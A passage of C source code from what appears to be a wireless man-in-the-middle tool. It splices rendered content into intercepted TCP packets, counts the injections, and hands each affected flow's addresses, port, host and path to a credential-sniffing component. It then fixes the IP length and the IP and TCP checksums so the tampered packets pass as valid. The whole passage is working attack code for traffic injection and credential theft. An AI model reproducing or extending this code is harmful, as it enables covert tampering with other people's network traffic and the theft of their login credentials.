                    region_len = data_len - hdr_len;
                } else {
                    region_len = 0;
                }
            }
            if(region_len > 0 && find_inject_anchor(region, region_len) >= 0) {
                if(compact_savings(region, region_len) >= rendered_len &&
                   inject_via_compaction(region, region_len, s_rendered, rendered_len)) {
                    modified = true;
                    injected_now = true;
                    via = "compact";
                }
            }
        }

        if(injected_now) {
            __atomic_fetch_add(&s_injected, 1u, __ATOMIC_RELAXED);
            (void)via;
            if(s_cred_sniff) {
                wlan_cred_sniff_push_inject(
                    s_cred_sniff, src_ip, dst_ip, dport, flow->host, flow->path);
            }
        }
    }

    if(!modified) return false;

    // IP-Total-Length aktualisieren falls gewachsen, dann Checksums neu.
    if(growth > 0) {
        ip_total += growth;
        tcp_len += growth;
        ip[2] = (uint8_t)(ip_total >> 8);
        ip[3] = (uint8_t)(ip_total & 0xff);
        recompute_ip_csum(ip);
        *len_ptr = (uint16_t)(len + growth);
    }
    recompute_tcp_csum(ip, ip_total);
    return true;
}
